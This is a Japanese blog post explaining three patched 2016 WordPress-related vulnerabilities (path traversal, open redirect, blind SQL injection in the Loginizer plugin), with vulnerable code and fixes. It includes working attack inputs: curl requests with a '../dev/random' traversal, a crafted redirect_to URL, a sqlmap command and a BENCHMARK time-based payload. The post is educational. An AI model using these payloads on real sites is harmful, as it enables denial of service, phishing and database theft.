## :spy: Path Traversal（ディレクトリトラバーサル）

[CWE-22](http://jvndb.jvn.jp/ja/cwe/CWE-22.html)によるとPath Traversalは以下のように記載されています。

>Many file operations are intended to take place within a restricted directory. By using special elements such as ".." and "/" separators, attackers can escape outside of the restricted location to access files or directories that are elsewhere on the system. One of the most common special elements is the "../" sequence, which in most modern operating systems is interpreted as the parent directory of the current location. This is referred to as relative path traversal. Path traversal also covers the use of absolute pathnames such as "/usr/local/bin", which may also be useful in accessing unexpected files. This is referred to as absolute path traversal.In many programming languages, the injection of a null byte (the 0 or NUL) may allow an attacker to truncate a generated filename to widen the scope of attack. For example, the software may add ".txt" to any pathname, thus limiting the attacker to text files, but a null injection may effectively remove this restriction. 

要約すると、ファイル名を要求するようなプログラムに対して、リクエストパラメータに"../"のような相対パスもしくは"/usr/local/bin"のような絶対パスを含めることで、本来アクセスできないファイルの実行・閲覧・取得が出来てしまう脆弱性です。 

今回ご紹介するPath Traversalは2016年に発見されたもので、管理者APIのAjaxハンドラに脆弱性がありました。該当箇所のソースコードを抜粋したものが以下になります。

```php
function wp_ajax_update_plugin() {
  global $wp_filesystem;

  $plugin = urldecode( $_POST['plugin'] );

  $status = array(
      'update'     => 'plugin',
      'plugin'     => $plugin,
      'slug'       => sanitize_key( $_POST['slug'] ),
      'oldVersion' => '',
      'newVersion' => '',
  );

  $plugin_data = get_plugin_data( WP_PLUGIN_DIR . '/' . $plugin );
  if ( $plugin_data['Version'] ) {
      $status['oldVersion'] = sprintf( __( 'Version %s' ), $plugin_data['Version'] );
  }

  if ( ! current_user_can( 'update_plugins' ) ) {
      $status['error'] = __( 'You do not have sufficient permissions to update plugins on this site.' );
      wp_send_json_error( $status );
  }

  check_ajax_referer( 'updates' );
```

この関数```php）をプラグインディレクトリから読み込んで、ファイルに記述してあるバージョン情報を取得しています。その後でユーザーの権限チェックやnonceチェックを行っています。

POSTで受け取ったプラグインファイル名をそのまま```get_plugin_data```に渡しており、ここがPath Traversalの脆弱性になっていることはお気付きになった方も多いかと思います。ただ、この処理の後で権限チェックやCSRF対策も行ってますし、```fopen```でファイルを開いてバージョン情報を読み込んでいるだけの処理なので、不正な文字列を送ってもエラーになるだけで実際には問題ないのではと思った方も多いと思います。

確かに```/etc/passwd```の中身を窃取するようなことは難しいかもしれません。しかし、もし悪意のある人間がsubscriber（購読者）権限を入手できる状態であれば、以下のような攻撃が可能になります。

```shell
curl --cookie-jar "testcookie" \
  --data "log=xxxx&pwd=xxxx&wp-submit=Log+In&redirect_to=%2f&testcookie=1" \
  "http://xxxxxx/wp-login.php" \
  >/dev/null 2>&1
  
curl --cookie "testcookie" \
  --data "plugin=../../../../../dev/random&action=update-plugin" \
  "http://xxxxxx/wp-admin/admin-ajax.php" \
  >/dev/null 2>&1
```

上記は最初にsubscriber権限を持ったユーザーが自分のログインユーザー名、パスワードでcookieを作り、そのcookieを使ってupdate-pluginにリクエストを送っています。ここで、パラメータのpluginに```../../../../../dev/random```を指定しているのですが、これが何を意味しているかお分かりでしょうか？

ご存知の方も多いと思いますが、```/dev/random```はランダムな文字列を発生させる時に使用される擬似デバイスファイルです。そして、この/dev/randomは乱数種をエントロピープールから取り出してランダムな文字列を生成します。エントロピープールは有限なので使い切ってしまうと一定のエントロピーに達するまで処理を中断（ブロック）してしまいます（ちなみに```/dev/urandom```は過去に使った乱数種を再利用するため中断しない）。

仮にphp.iniの```session.entropy_file```（PHP 7.1.0で廃止）で/dev/randomを指定していた場合、エントロピープールが枯渇するとセッションの生成に遅延が生じます。また、他のアプリケーションで使用していた場合にも影響が出てしまいます。

実際にリクエストを複数回送信した時のエントロピープールの状態は以下の通りです。最初2945だった数値が38まで低下しています。

![エントロピープール](./60c7ba85-1ac6-7a06-f92b-aabadd255f8d.gif)

なお、脆弱性があった部分は以下のようにスラッシュを削除しサニタイズする処理に変更されました。

```php
前）$plugin = urldecode( $_POST['plugin'] );
後）$plugin = plugin_basename( sanitize_text_field( wp_unslash( $_POST['plugin'] ) ) );
```

## :spy: Open Redirect

[CWE-601](https://cwe.mitre.org/data/definitions/601.html)によるとOpen Redirectとは以下のように記載されています。

>An http parameter may contain a URL value and could cause the web application to redirect the request to the specified URL. By modifying the URL value to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts have a more trustworthy appearance. 

要約すると、```php?url=（フィッシングサイトのURL）```のようなURLを標的者に踏ませて悪意のあるサイトに誘導できる脆弱性です。 

今回ご紹介するOpen Redirectは2016年に発見されたもので、WordPressのログイン画面に脆弱性がありました。WordPressのログイン画面（```php```）には```redirect_to```というパラメータがhiddenフィールドで設置されています。

```
<input type="hidden" name="redirect_to" value="http://xxxxxx/wp-admin/" />
```

いろいろな用途でこのパラメータは使われているのですが、ログイン成功後のリダイレクト先としても使われています。

では実際に、問題があった箇所のソースコードを見てみましょう。

```php
function wp_validate_redirect($location, $default = '') {
  $location = trim( $location );
  // browsers will assume 'http' is your protocol, and will obey a redirect to a URL starting with '//'
  if ( substr($location, 0, 2) == '//' )
      $location = 'http:' . $location;

  // In php 5 parse_url may fail if the URL query part contains http://, bug #38143
  $test = ( $cut = strpos($location, '?') ) ? substr( $location, 0, $cut ) : $location;

  $lp  = parse_url($test);

  // Give up if malformed URL
  if ( false === $lp )
      return $default;

  // Allow only http and https schemes. No data:, etc.
  if ( isset($lp['scheme']) && !('http' == $lp['scheme'] || 'https' == $lp['scheme']) )
      return $default;

  // Reject if scheme is set but host is not. This catches urls like https:host.com for which parse_url does not set the host field.
  if ( isset($lp['scheme'])  && !isset($lp['host']) )
      return $default;

  $wpp = parse_url(home_url());
  $site = parse_url( site_url() );

  $allowed_hosts = (array) apply_filters( 'allowed_redirect_hosts', array( $wpp['host'], $site['host'] ), isset( $lp['host'] ) ? $lp['host'] : '' );

  if ( isset($lp['host']) && ( ! in_array( $lp['host'], $allowed_hosts ) && ( $lp['host'] != strtolower( $wpp['host'] ) || $lp['host'] != strtolower( $site['host'] ) ) ) )
      $location = $default;

  return $location;
}
```

上記関数はリダイレクトに指定されたURLの妥当性を検証しているのですが、```parse_url```でURLを構成要素に分解し、hostが①「許可されているもの」 ②「自分自身」 の場合のみ有効なURLとみなしています。処理を見る限りでは自分で許可しない限りは大丈夫そうに見えるのですが、どこに問題があるかお分かりでしょうか:thinking:

これにはphp5.6.28で修正された```parse_url```のバグが関係しています。

http://php.net/ChangeLog-5.php#5.6.28

例えば以下のようなURLで```parse_url```を実行すると不具合が発生します。

```php
parse_url('http://example.com#@xxxxx.com/')
```

まずphp5.6.28以降のバージョンで実行してみます。

```php
array(3) {
  ["scheme"]=>
  string(4) "http"
  ["host"]=>
  string(11) "example.com"
  ["fragment"]=>
  string(11) "@xxxxx.com/"
}
```

続いてphp5.6.28より古いバージョンで実行してみます。

```php
array(4) {
  ["scheme"]=>
  string(4) "http"
  ["host"]=>
  string(9) "xxxxx.com"
  ["user"]=>
  string(12) "example.com#"
  ["path"]=>
  string(1) "/"
}
```

hostが正しく解釈されていないことが分かるかと思います。URLにはBasic認証の情報を```http://user:password@example.com/```のような形で埋め込めるのですが、php5.6.28より古いバージョンだと上記のようなケースでhostを正しく解釈できないようです。

つまり、以下のようなURLを```redirect_to```に設定すれば「host=正当なURL」となり、```wp_validate_redirect```をバイパス出来てしまいます。

```
http://（悪意のあるサイトのURL）#@（正当なURL）/
```

実際には、以下のようなURLをユーザーに踏ませると、hiddenフィールドに値が設定されログイン成功後に別ドメインにリダイレクトされてしまいます。

```
http://xxxxx.com/wp-login.php?redirect_to=http://example.com%23@xxxxx.com/
```

![Open Redirect](./1925c205-79a2-a0bb-2466-2adecbf6de4c.gif)

なお、どのような修正が行われたのかは以下のURLからご確認いただけます。

https://core.trac.wordpress.org/changeset/36444

##:spy: ブラインドSQLインジェクション
[OWASP](https://www.owasp.org/index.php/Blind_SQL_Injection)にるとブラインドSQLインジェクション（Blind SQL Injection）は以下のように記載されています。

>Blind SQL (Structured Query Language) injection is a type of SQL Injection attack that asks the database true or false questions and determines the answer based on the applications response. This attack is often used when the web application is configured to show generic error messages, but has not mitigated the code that is vulnerable to SQL injection.When an attacker exploits SQL injection, sometimes the web application displays error messages from the database complaining that the SQL Query's syntax is incorrect. Blind SQL injection is nearly identical to normal SQL Injection, the only difference being the way the data is retrieved from the database. When the database does not output data to the web page, an attacker is forced to steal data by asking the database a series of true or false questions. This makes exploiting the SQL Injection vulnerability more difficult, but not impossible. . 

要約すると、ブラインドSQLインジェクションはSQLインジェクションの一種ですが、検索される方法に違いがあります。通常のSQLインジェクションのようにUNION SELECTなどで本来表示されないデータを画面に表示させる方法とは異なり、クエリの結果が画面に表示されない場合にクエリの成功・失敗やクエリ実行の時間差を使って1ビットの情報を取得し、それを何回も繰り返していくことで最終的にデータを窃取する方法になります。

詳しい解説は徳丸先生の以下の記事をご覧ください。

- [ブラインドSQLインジェクションのスクリプトをPHPで書いたよ](https://blog.tokumaru.org/2012/12/blind-sql-injection-php-exploit.html)
- [Time-based SQL Injectionは意外に実用的だった](https://blog.tokumaru.org/2015/04/time-based-sql-injection.html)

今回ご紹介するブラインドSQLインジェクションは、Loginizerというサードパーティ製のセキュリティプラグインに見つかった脆弱性になります。このプラグインはアクセス元のIPアドレスをもとにログイン失敗の情報を記録したり、ブラックリストに登録されたIPアドレスを拒否したりしてくれるのですが、このIPアドレスの部分の処理に問題がありました。

問題があった箇所を抜粋したものが以下になります。```php```を見ると```X-Forwarded-For```ヘッダーが指定されている場合、そのヘッダーからIPアドレスを取得していることが分かります。そして、取得したIPアドレスはプレースホルダーを使わずにWHERE条件に指定されています。つまり、この```X-Forwarded-For```ヘッダーにSQLインジェクションの脆弱性があることになります。

```php
function lz_getip(){
	
	global $loginizer;
	
	$ip = _lz_getip();
	
	$loginizer['ip_method'] = (int) @$loginizer['ip_method'];
	
	if(isset($_SERVER["REMOTE_ADDR"])){
		$ip = $_SERVER["REMOTE_ADDR"];
	}
	
	if(isset($_SERVER["HTTP_X_FORWARDED_FOR"]) && @$loginizer['ip_method'] == 1){
		$ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
	}
	
	if(isset($_SERVER["HTTP_CLIENT_IP"]) && @$loginizer['ip_method'] == 2){
		$ip = $_SERVER["HTTP_CLIENT_IP"];
	}
	
	return $ip;
	
}
```

```php
function loginizer_can_login(){
	
	global $wpdb, $loginizer, $lz_error;
	
	// Get the logs
	$result = lz_selectquery("SELECT * FROM `".$wpdb->prefix."loginizer_logs` WHERE `ip` = '".$loginizer['current_ip']."';");
```

では、[sqlmap](http://sqlmap.org/)というペネトレーションテストツールを使って実際に試してみましょう。

```shell
python sqlmap.py -u "http://xxxxxxxx/wp-login.php" \
--data "user_login=1&user_pass=1&wp-submit=Login&testcookie=1" \
--headers="X-Forwarded-For: *" --level=5 --risk=3 --dbms=MySQL
```

上記のようなコマンドをコンソール上で実行すると以下のような結果が返って来ました。

![sqlmapの結果](./60582805-fda5-bd9f-6fcd-547527a8f1db.gif)


Typeの項目を見るとTime-based SQL Injectionの脆弱性があることが分かります。

```
Type: AND/OR time-based blind
```

Payloadの項目に実際にリクエストされた値が表示されています。

```
Payload: ' AND 2418=BENCHMARK(5000000,MD5(0x48515358))-- PYWm
```

つまり、以下のようなSQLが実行されているということになります。

```sql
select * from `wp_loginizer_logs` where `ip` = '' AND 2418=BENCHMARK(5000000,MD5(0x48515358))-- PYWm';
```

[BENCHMARK](https://dev.mysql.com/doc/refman/5.6/ja/information-functions.html#function_benchmark)関数は式の処理速度を計測する場合などに使われるものです。つまり、Vectorに記載されている内容から分かるように、特定条件の場合のみBENCHMARK関数が実行されるようにし、その時間差を計測することを繰り返せばデータを取り出すことが可能になります。

```
Vector: AND [RANDNUM]=IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])
```


##まとめ
正直なところ、この記事を書くまでは自分自身ではセキュリティ対策をやっているつもりでしたが、いろいろ調べる中でその認識が甘かったことを痛感しました。技術のトレンドは目まぐるしく動き、ついついトレンドを追うことに目を奪われがちですが、今一度基本に立ち返ってセキュリティのことを考えることが大切ではないでしょうか。（この記事は自分で動作検証した上で書いておりますが、内容に間違いなどありましたらコメントでご指摘頂けると幸いです）

:warning:悪用されないように古い脆弱性を取り上げましたが、WordPressやプラグインをずっと更新していないという方は更新されることをお勧めいたします。
